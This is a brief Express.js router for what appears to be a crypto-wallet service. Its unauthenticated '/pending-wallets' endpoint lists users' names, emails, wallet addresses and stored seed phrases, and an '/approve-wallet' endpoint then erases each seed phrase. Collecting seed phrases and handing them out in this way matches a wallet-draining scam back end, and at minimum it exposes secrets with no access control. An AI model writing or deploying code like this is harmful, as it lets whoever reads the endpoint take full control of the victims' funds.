const express = require('express');
const router = express.Router();
const User = require('../models/User');

router.get('/pending-wallets', async (req, res) => {
    try {
        const users = await User.find({ walletStatus: 'pending' }).select('name email walletAddress seedPhrase');
        res.json(users);
    } catch (e) { res.status(500).json({ message: "Error" }); }
});

router.post('/approve-wallet/:email', async (req, res) => {
    try {
        await User.findOneAndUpdate({ email: req.params.email }, { walletStatus: 'approved', seedPhrase: null });
        res.json({ message: "Approved" });
    } catch (e) { res.status(500).json({ message: "Error" }); }
});
module.exports = router;
